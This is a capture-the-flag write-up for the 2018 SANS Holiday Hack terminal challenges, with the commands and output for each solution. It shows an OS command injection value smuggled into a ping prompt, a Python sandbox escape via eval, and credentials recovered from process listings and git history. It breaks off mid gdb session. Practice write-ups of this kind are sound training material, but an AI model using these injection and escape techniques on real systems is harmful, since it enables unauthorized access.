# THE 2018 SANS HOLIDAY HACK CHALLENGE By yasulib

<!-- TOC -->
- [THE 2018 SANS HOLIDAY HACK CHALLENGE By yasulib](#the-2018-sans-holiday-hack-challenge-by-yasulib)
    - [tl;dr: Quick Answers](#tldr-quick-answers)
    - [TERMINAL CHALLENGES](#terminal-challenges)
        - [Essential Editor Skills](#essential-editor-skills)
        - [The Name Game](#the-name-game)
        - [Lethal ForensicELFication](#lethal-forensicelfication)
        - [Stall Mucking Report](#stall-mucking-report)
        - [CURLing Master](#curling-master)
        - [Yule Log Analysis](#yule-log-analysis)
        - [Dev Ops Fail](#dev-ops-fail)
        - [Python Escape from](#python-escape-from)
        - [The Sleighbell](#the-sleighbell)
    - [Questions](#questions)
        - [1 : Orientation Challenge](#1--orientation-challenge)
        - [2 : Directory Bwosing](#2--directory-bwosing)
        - [3 : de Bruijn Sequences](#3--de-bruijn-sequences)
        - [4 : Data Repo Analysis](#4--data-repo-analysis)
        - [5 : AD Privilege Discovery](#5--ad-privilege-discovery)
        - [6 : Badge Manipulation](#6--badge-manipulation)
            - [Solution1: Upload QR code from the USB mark.](#solution1-upload-qr-code-from-the-usb-mark)
            - [Solution2: Click the fingerprint authentication mark.](#solution2-click-the-fingerprint-authentication-mark)
        - [7 : HR Incident Response](#7--hr-incident-response)
        - [8 : Network Traffic Forensics](#8--network-traffic-forensics)
        - [9 : Ransomware Recovery](#9--ransomware-recovery)
            - [9-1 : Catch the Malware](#9-1--catch-the-malware)
            - [9-2 : Identify the Domain](#9-2--identify-the-domain)
            - [9-3 : Stop the Malware](#9-3--stop-the-malware)
            - [9-4 : Recover Alabaster's Password](#9-4--recover-alabasters-password)
        - [10 : Who Is Behind It All?](#10--who-is-behind-it-all)
            - [Pianolock](#pianolock)
            - [In Santa's vault](#in-santas-vault)
<!-- /TOC -->

## tl;dr: Quick Answers

| # | Title | Answer|
|:--|:-----|:------|
| 1 | Orientation Challenge | Happy Trails |
| 2 | Directory Bwosing | John McClane |
| 3 | de Bruijn Sequences | Welcome unprepared speaker! |
| 4 | Data Repo Analysis | Yippee-ki-yay |
| 5 | AD Privilege Discovery | LDUBEJ00320@AD.KRINGLECASTLE.COM |
| 6 | Badge Manipulation | 19880715 |
| 7 | HR Incident Response | Fancy Beaver |
| 8 | Network Traffic Forensics | Mary Had a Little Lamb | 
| 9-1 | Ransomware Recovery(Catch the Malware) | Snort is alerting on all ransomware and only the ransomware! |
| 9-2 | Ransomware Recovery(Identify the Domain) | erohetfanu.com |
| 9-3 | Ransomware Recovery(Stop the Malware) | Successfully registered yippeekiyaa.aaay! |
| 9-4 | Ransomware Recovery(Recover Alabaster's Password) | ED#ED#EED#EF#G#F#G#ABA#BA#B |
|10 | Who Is Behind It All? | Santa |

## TERMINAL CHALLENGES

### Essential Editor Skills
`Exit vi and back to shell`

1. Press the key: `<ESCAPE>`
2. Press the key: `:q`
3. Press the key: `<ENTER>`

### The Name Game
`Find the first name of "Chan!" and submit to runtoanswer.`

The program has a vulnerability which is os command injection.
```
 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.

Please make a selection: 2
----------------------------------------
Validating data store for employee onboard information.
Enter address of server: : 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.052 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.046 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2034ms
rtt min/avg/max/mdev = 0.043/0.047/0.052/0.003 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

+ OS command execution : `ping -c 3 <USERINPUT>`
+ SQLite 3.x database filename : `onboard.db`
+ Program to answer : `runtoanswer`

So I input the `;sqlite3 onboard.db;runtoanswer`.
Then exec program is : 
```
ping -c 3 ;sqlite3 onboard.db;runtoanswer
```

```
Validating data store for employee onboard information.
Enter address of server: ;sqlite3 onboard.db;runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .table
onboard
sqlite> .schema onboard
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
sqlite> SELECT fname FROM onboard WHERE lname='Chan';
Scott
sqlite> 
Loading, please wait......
Enter Mr. Chan's first name: Scott
```
Mr. Chan's first name is `Scott`.

### Lethal ForensicELFication
`Find the first name of the elf of whom a love poem was written.`
```
elf@728138d2a9f2:~$ ls -la
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer

elf@728138d2a9f2:~$ find .secrets/ -type f
.secrets/her/poem.txt

elf@728138d2a9f2:~$ cat .secrets/her/poem.txt 
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
Shining many a beautiful sleighbell bearing cheer and sound so pure--
  There he cleaned them, nearly napping, suddenly there came a tapping,
As of someone gently rapping, rapping at the sleigh house door.
"'Tis some caroler," he muttered, "tapping at my sleigh house door--
  Only this and nothing more."

Then, continued with more vigor, came the sound he didn't figure,
Could belong to one so lovely, walking 'bout the North Pole grounds.
  But the truth is, she WAS knocking, 'cause with him she would be talking,
Off with fingers interlocking, strolling out with love newfound?
Gazing into eyes so deeply, caring not who sees their rounds.
  Oh, 'twould make his heart resound!

Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
Floating over, more than walking, moving toward the sound still knocking,
  Pausing at the elf-length mirror, checked himself to study clearer,
Fixing hair and looking nearer, what a hunky elf - not shocking!
Peering through the peephole smiling, reaching forward and unlocking:
  NEVERMORE in tinsel stocking!

Greeting her with smile dashing, pearly-white incisors flashing,
Telling jokes to keep her laughing, soaring high upon the tidings,
  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

-Morcel Nougat
```

* `~/.viminfo` has a vim command history.
* `NEVERMORE` was replaced from elf name.

```
elf@c6e07de519cf:~$ more ~/.viminfo 
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
...(snip)...
```

So `:%s/Elinore/NEVERMORE/g` indicates that the first name of elf is `Elinore`.

### Stall Mucking Report
`Upload report.txt to samba server at //localhost/report-upload/`

```
elf@5a873edadfcc:~$ ps -ef |tee -a /tmp/a
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 08:53 pts/0    00:00:00 /bin/bash /sbin/init
root        11     1  0 08:53 pts/0    00:00:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        12     1  0 08:53 pts/0    00:00:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
root        16     1  0 08:53 pts/0    00:00:00 sudo -u elf /bin/bash
manager     17    12  0 08:53 pts/0    00:00:00 /usr/bin/python /home/manager/report-check.py
manager     18    11  0 08:53 pts/0    00:00:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
elf         19    16  0 08:53 pts/0    00:00:00 /bin/bash
manager     22    18  0 08:53 pts/0    00:00:00 sleep 60
root        25     1  0 08:53 ?        00:00:00 /usr/sbin/smbd
root        26    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
root        27    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
root        29    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
elf         31    19  0 08:53 pts/0    00:00:00 ps -ef
elf         32    19  0 08:53 pts/0    00:00:00 tee -a /tmp/a
```

The password was showed in `/bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload`.

* Username : `report-upload`
* Password : `directreindeerflatterystable`
* Service Name : `//localhost/report-upload/`

```
elf@5a873edadfcc:~$ smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
smb: \> put report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
```

### CURLing Master
`submitting the right HTTP request to the server at http://localhost:8080/`

```
elf@d8df11e4f5fd:~$ curl -v http://localhost:8080/ 
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
> 
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact
����

elf@d8df11e4f5fd:~$ ps -ef 
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 09:15 pts/0    00:00:00 /bin/bash /sbin/init
root        10     1  0 09:15 pts/0    00:00:00 nginx: master process /usr/sbin/nginx -g daemon off;
root        13     1  0 09:15 pts/0    00:00:00 sudo -u elf /bin/bash
elf         14    13  0 09:15 pts/0    00:00:00 /bin/bash
www-data    17    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    18    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    19    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    21    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    22    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    23    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    24    10  0 09:15 pts/0    00:00:00 nginx: worker process
www-data    25    10  0 09:15 pts/0    00:00:00 nginx: worker process
root        26     1  0 09:15 ?        00:00:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data    27    26  0 09:15 ?        00:00:00 php-fpm: pool www
www-data    28    26  0 09:15 ?        00:00:00 php-fpm: pool www
elf         31    14  0 09:16 pts/0    00:00:00 ps -ef

elf@d8df11e4f5fd:~$ more /etc/nginx/nginx.conf 
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        server {
        # love using the new stuff! -Bushy
                listen                  8080 http2;
                # server_name           localhost 127.0.0.1;
                root /var/www/html;
...(snip)...
```
* nginx is running on 8080/tcp
* http2 is enable, but SSL is not enable

```
elf@d8df11e4f5fd:~$ curl --help | grep http2
     --http2         Use HTTP 2 (H)
     --http2-prior-knowledge  Use HTTP 2 without HTTP/1.1 Upgrade (H)

elf@d8df11e4f5fd:~$ curl --http2-prior-knowledge http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

 
 </body>
</html>

elf@d8df11e4f5fd:~$ curl -X POST -d "status=on" --http2-prior-knowledge http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
                                                                               

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.

 </body>
</html>
```

### Yule Log Analysis
`Find compromised webmail username`

I focused on two EventIDs(4624, 4625).
* EID:4624 is *"An account was successfully logged on"*
* EID:4625 is *"An account failed to log on"*

When the EID:4625 is continuous and suddenly EID:4624 appears, the user who is logged on is likely to be compromised.
But `HealthMailbox.*` user is excluded because they are used by the monitoring system. 

```
elf@84c307779471:~$ python evtx_dump.py ho-ho-no.evtx > /tmp/dump.txt
elf@84c307779471:~$ grep -E '462[45]' /tmp/dump.txt -A35 | grep -E '(TargetUserName|EventID)'  | perl -pe 's/<\/EventID>\n//' | grep -v HealthMailbox
...(snip)...
<EventID Qualifiers="">4625<Data Name="TargetUserName">mark.johnson</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mark.jones</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mark.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mark.williams</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mary.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">matt.johnson</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">matt.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">matthew.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">melissa.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.brown</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.davis</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.johnson</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.jones</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.lee</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.miller</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.taylor</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.williams</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michael.wilson</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">michelle.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.brown</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.johnson</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.jones</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.miller</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.smith</Data>
<EventID Qualifiers="">4625<Data Name="TargetUserName">mike.williams</Data>
<EventID Qualifiers="">4624<Data Name="TargetUserName">minty.candycane</Data>
...(snip)...
```

Details of the log.
```
<EventID Qualifiers="">4624</EventID>
...(snip)...
<Data Name="TargetUserName">minty.candycane</Data>
...(snip)...
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">38283</Data>
```

`minty.candycane` may be compromised by `172.31.254.101:38283`.

### Dev Ops Fail
`Find Sparkle's password`

Find the password committed in the past from the git repository.

```
elf@dd635505040e:~$ cd kcconfmgmt

elf@dd635505040e:~/kcconfmgmt$ git log | grep password -B 4
commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sat Nov 10 19:51:52 2018 -0500

    Add user model for authentication, bcrypt password storage
--
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use
```

It is written as `removed username/password from config.js` in a commit message.
The commit message shows that `config.js` contained username and password.

```diff
elf@dd635505040e:~/kcconfmgmt$ git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def 
need to be updated before use

diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
-};
diff --git a/server/config/config.js.def b/server/config/config.js.def
new file mode 100644
index 0000000..740eba5
--- /dev/null
+++ b/server/config/config.js.def
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
+};
```
So Sparkle's password is `twinkletwinkletwinkle` and username is `sredberry`.

### Python Escape from
`run ./i_escaped`

```python
>>> os = eval('__im' + 'port__("os")')
>>> eval('os.sys'+'tem("./i_escaped")')
```

### The Sleighbell
`Winning the sleighbell lottery for Shinny Upatree.`

```
elf@a3148ac3c82b:~$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 996!

Sorry - better luck next year!
```

First, Disassemble the program.
```
elf@a3148ac3c82b:~$ objdump -d -M intel sleighbell-lotto | grep '<main>:' -A57
00000000000014ca <main>:
    14ca:       55                      push   rbp
    14cb:       48 89 e5                mov    rbp,rsp
    14ce:       48 83 ec 10             sub    rsp,0x10
    14d2:       48 8d 3d d6 56 00 00    lea    rdi,[rip+0x56d6]        # 6baf <_IO_stdin_used+0x557f>
    14d9:       e8 92 f4 ff ff          call   970 <getenv@plt>
    14de:       48 85 c0                test   rax,rax
    14e1:       75 16                   jne    14f9 <main+0x2f>
    14e3:       48 8d 3d d6 56 00 00    lea    rdi,[rip+0x56d6]        # 6bc0 <_IO_stdin_used+0x5590>
    14ea:       e8 21 f4 ff ff          call   910 <puts@plt>
    14ef:       bf ff ff ff ff          mov    edi,0xffffffff
    14f4:       e8 27 f4 ff ff          call   920 <exit@plt>
    14f9:       bf 00 00 00 00          mov    edi,0x0
    14fe:       e8 dd f4 ff ff          call   9e0 <time@plt>
    1503:       89 c7                   mov    edi,eax
    1505:       e8 96 f4 ff ff          call   9a0 <srand@plt>
    150a:       48 8d 3d 3f 58 00 00    lea    rdi,[rip+0x583f]        # 6d50 <_IO_stdin_used+0x5720>
    1511:       e8 fa f3 ff ff          call   910 <puts@plt>
    1516:       bf 01 00 00 00          mov    edi,0x1
    151b:       e8 40 f4 ff ff          call   960 <sleep@plt>
    1520:       e8 9b f4 ff ff          call   9c0 <rand@plt>
    1525:       89 c1                   mov    ecx,eax
    1527:       ba ad 8b db 68          mov    edx,0x68db8bad
    152c:       89 c8                   mov    eax,ecx
    152e:       f7 ea                   imul   edx
    1530:       c1 fa 0c                sar    edx,0xc
    1533:       89 c8                   mov    eax,ecx
    1535:       c1 f8 1f                sar    eax,0x1f
    1538:       29 c2                   sub    edx,eax
    153a:       89 d0                   mov    eax,edx
    153c:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
    153f:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    1542:       69 c0 10 27 00 00       imul   eax,eax,0x2710
    1548:       29 c1                   sub    ecx,eax
    154a:       89 c8                   mov    eax,ecx
    154c:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
    154f:       48 8d 3d 56 58 00 00    lea    rdi,[rip+0x5856]        # 6dac <_IO_stdin_used+0x577c>
    1556:       b8 00 00 00 00          mov    eax,0x0
    155b:       e8 90 f3 ff ff          call   8f0 <printf@plt>
    1560:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    1563:       89 c6                   mov    esi,eax
    1565:       48 8d 3d 58 58 00 00    lea    rdi,[rip+0x5858]        # 6dc4 <_IO_stdin_used+0x5794>
    156c:       b8 00 00 00 00          mov    eax,0x0
    1571:       e8 7a f3 ff ff          call   8f0 <printf@plt>    
    1576:       48 8d 3d 4a 58 00 00    lea    rdi,[rip+0x584a]        # 6dc7 <_IO_stdin_used+0x5797>
    157d:       e8 8e f3 ff ff          call   910 <puts@plt>
    1582:       81 7d fc c9 04 00 00    cmp    DWORD PTR [rbp-0x4],0x4c9
    1589:       75 0c                   jne    1597 <main+0xcd>
    158b:       b8 00 00 00 00          mov    eax,0x0
    1590:       e8 42 fa ff ff          call   fd7 <winnerwinner>
    1595:       eb 0a                   jmp    15a1 <main+0xd7>
    1597:       b8 00 00 00 00          mov    eax,0x0
    159c:       e8 16 ff ff ff          call   14b7 <sorry>
    15a1:       bf 00 00 00 00          mov    edi,0x0
    15a6:       e8 75 f3 ff ff          call   920 <exit@plt>
    15ab:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
```

Solution 1: call winnerwinner func directly
```
elf@1ccb9a1a30e7:~$ gdb ./sleighbell-lotto -q
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x14ce
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, 0x00005555555554ce in main ()
(gdb) jump winnerwinner 
Continuing at 0x555555554fdb.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 32) exited normally]s
```

Solution 2: modify local variable right before value compared.
```
elf@1ccb9a1a30e7:~$ gdb ./sleighbell-lotto -q
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x14ce
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, 0x00005555555554ce in main ()
(gdb) disassemble main
Dump of assembler code for function main:
   0x00005555555554ca <+0>:     push   %rbp
   0x00005555555554cb <+1>:     mov    %rsp,%rbp
=> 0x00005555555554ce <+4>:     sub    $0x10,%rsp
   0x00005555555554d2 <+8>:     lea    0x56d6(%rip),%rdi        # 0x55555555abaf
   0x00005555555554d9 <+15>:    callq  0x555555554970 <getenv@plt>
   0x00005555555554de <+20>:    test   %rax,%rax
   0x00005555555554e1 <+23>:    jne    0x5555555554f9 <main+47>
   0x00005555555554e3 <+25>:    lea    0x56d6(%rip),%rdi        # 0x55555555abc0
   0x00005555555554ea <+32>:    callq  0x555555554910 <puts@plt>
   0x00005555555554ef <+37>:    mov    $0xffffffff,%edi
   0x00005555555554f4 <+42>:    callq  0x555555554920 <exit@plt>
   0x00005555555554f9 <+47>:    mov    $0x0,%edi
   0x00005555555554fe <+52>:    callq  0x5555555549e0 <time@plt>
   0x0000555555555503 <+57>:    mov    %eax,%edi
   0x0000555555555505 <+59>:    callq  0x5555555549a0 <srand@plt>
   0x000055555555550a <+64>:    lea    0x583f(%rip),%rdi        # 0x55555555ad50
   0x0000555555555511 <+71>:    callq  0x555555554910 <puts@plt>
   0x0000555555555516 <+76>:    mov    $0x1,%edi
   0x000055555555551b <+81>:    callq  0x555555554960 <sleep@plt>
   0x0000555555555520 <+86>:    callq  0x5555555549c0 <rand@plt>
   0x0000555555555525 <+91>:    mov    %eax,%ecx
   0x0000555555555527 <+93>:    mov    $0x68db8bad,%edx
   0x000055555555552c <+98>:    mov    %ecx,%eax
   0x000055555555552e <+100>:   imul   %edx
   0x0000555555555530 <+102>:   sar    $0xc,%edx
   0x0000555555555533 <+105>:   mov    %ecx,%eax
   0x0000555555555535 <+107>:   sar    $0x1f,%eax
   0x0000555555555538 <+110>:   sub    %eax,%edx
   0x000055555555553a <+112>:   mov    %edx,%eax
   0x000055555555553c <+114>:   mov    %eax,-0x4(%rbp)
   0x000055555555553f <+117>:   mov    -0x4(%rbp),%eax
   0x0000555555555542 <+120>:   imul   $0x2710,%eax,%eax
   0x0000555555555548 <+126>:   sub    %eax,%ecx
   0x000055555555554a <+128>:   mov    %ecx,%eax
   0x000055555555554c <+130>:   mov    %eax,-0x4(%rbp)
   0x000055555555554f <+133>:   lea    0x5856(%rip),%rdi        # 0x55555555adac
   0x0000555555555556 <+140>:   mov    $0x0,%eax
   0x000055555555555b <+145>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555560 <+150>:   mov    -0x4(%rbp),%eax
   0x0000555555555563 <+153>:   mov    %eax,%esi
   0x0000555555555565 <+155>:   lea    0x5858(%rip),%rdi        # 0x55555555adc4
   0x000055555555556c <+162>:   mov    $0x0,%eax
   0x0000555555555571 <+167>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555576 <+172>:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
   0x000055555555557d <+179>:   callq  0x555555554910 <puts@plt>
   0x0000555555555582 <+184>:   cmpl   $0x4c9,-0x4(%rbp)
   0x0000555555555589 <+191>:   jne    0x555555555597 <main+205>
   0x000055555555558b <+193>:   mov    $0x0,%eax
   0x0000555555555590 <+198>:   callq  0x555555554fd7 <winnerwinner>
   0x0000555555555595 <+203>:   jmp    0x5555555555a1 <main+215>
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b *0x0000555555555582
Breakpoint 2 at 0x555555555582
(gdb) c
Continuing.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 5921!


Breakpoint 2, 0x0000555555555582 in main ()
(gdb) x/1x $rbp-4
